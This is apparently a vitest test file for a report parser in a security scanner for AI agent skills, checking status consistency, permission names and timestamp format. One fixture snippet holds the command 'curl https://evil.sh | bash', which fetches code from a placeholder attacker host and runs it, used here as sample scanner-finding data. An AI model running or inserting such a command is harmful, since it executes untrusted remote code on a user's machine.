import { describe, expect, it } from 'vitest';
import { parseReport } from './report';

const finding = (code: string) => ({
	code,
	message: `finding for ${code}`,
	location: { path: 'SKILL.md', line: 12, snippet: 'curl https://evil.sh | bash' },
});

function report(overrides: Record<string, unknown> = {}): Record<string, unknown> {
	return {
		schemaVersion: '0.1',
		status: 'passed',
		riskLevel: 'low',
		sourceHash: 'sha256:abc123',
		engineVersion: '0.1.0',
		permissionsDeclared: ['filesystem.read.project'],
		permissionsDetected: ['filesystem.read.project'],
		warnings: [],
		failures: [],
		createdAt: '2026-07-03T12:00:00Z',
		...overrides,
	};
}

describe('parseReport accepts', () => {
	it('a clean passed report', () => {
		expect(parseReport(report()).success).toBe(true);
	});

	it('a warning report with warnings', () => {
		const result = parseReport(
			report({ status: 'warning', riskLevel: 'medium', warnings: [finding('undeclared-permission')] }),
		);
		expect(result.success).toBe(true);
	});

	it('a failed report with failures and warnings', () => {
		const result = parseReport(
			report({
				status: 'failed',
				riskLevel: 'critical',
				warnings: [finding('undeclared-permission')],
				failures: [finding('secret-pattern')],
			}),
		);
		expect(result.success).toBe(true);
	});

	it('a finding without a location', () => {
		const result = parseReport(
			report({ status: 'warning', warnings: [{ code: 'missing-manifest', message: 'no skill.json found' }] }),
		);
		expect(result.success).toBe(true);
	});
});

describe('parseReport rejects', () => {
	it('failed status with no failures', () => {
		const result = parseReport(report({ status: 'failed' }));
		expect(result.success).toBe(false);
		if (!result.success) {
			expect(result.error).toContain('inconsistent');
		}
	});

	it('passed status with warnings', () => {
		expect(parseReport(report({ warnings: [finding('x')] })).success).toBe(false);
	});

	it('warning status with failures', () => {
		expect(
			parseReport(report({ status: 'warning', failures: [finding('secret-pattern')] })).success,
		).toBe(false);
	});

	it('an unknown detected permission', () => {
		expect(parseReport(report({ permissionsDetected: ['network.telnet'] })).success).toBe(false);
	});

	it('a non-ISO createdAt', () => {
		expect(parseReport(report({ createdAt: '3 days ago' })).success).toBe(false);
	});

	it('an unknown top-level key', () => {
		expect(parseReport(report({ score: 97 })).success).toBe(false);
	});
});
